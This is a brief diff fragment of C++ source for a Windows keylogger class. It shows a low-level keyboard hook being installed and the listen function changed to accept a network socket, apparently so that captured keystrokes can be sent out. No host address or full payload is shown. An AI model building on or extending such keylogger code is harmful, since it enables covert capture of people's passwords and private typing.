@@ -250,7 +250,7 @@ LRESULT CALLBACK KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lPar
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-void KeyLogger::startListen()
+void KeyLogger::startListen(SOCKET sock)
 {
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::recordKeyboard, 0, 0);
 	MSG msg;
